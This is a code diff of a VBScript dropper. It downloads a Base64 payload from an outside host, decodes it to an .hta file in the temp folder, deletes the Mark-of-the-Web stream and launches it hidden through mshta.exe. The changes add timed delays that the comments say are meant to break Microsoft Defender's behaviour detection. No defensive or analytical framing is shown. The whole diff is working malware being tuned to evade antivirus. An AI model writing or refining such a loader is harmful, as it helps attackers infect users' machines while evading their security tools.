@@ -10,14 +10,17 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. Fetch the Base64 payload
+' 1. WAIT 2 SECONDS (Breaks Defender's behavior chain)
+Dim w: w = Timer()
+Do While Timer() - w < 2
+Loop
+
+' 2. Fetch the Base64 payload
 xh.Open "GET", "https://dicerigx.app/payload.txt", False
 xh.Send
 
 If xh.Status = 200 Then
     b64 = xh.responseText
-    
-    ' 2. Clean the string
     cleanB64 = Replace(b64, vbCr, "")
     cleanB64 = Replace(cleanB64, vbLf, "")
     cleanB64 = Replace(cleanB64, vbTab, "")
@@ -26,7 +29,6 @@ If xh.Status = 200 Then
     
     path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
     
-    ' 3. Decode to local file
     Set xml = CreateObject("MSXML2.DOMDocument")
     Set node = xml.CreateElement("b64")
     node.dataType = "bin.base64"
@@ -39,10 +41,14 @@ If xh.Status = 200 Then
     st.SaveToFile path, 2
     st.Close
     
-    ' 4. Strip MOTW and Run
     On Error Resume Next
     fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
+    
+    ' 3. WAIT 2 SECONDS BEFORE RUNNING (Breaks the chain again)
+    w = Timer()
+    Do While Timer() - w < 2
+    Loop
     
     sh.Run "mshta.exe """ & path & """", 0, False
 End If
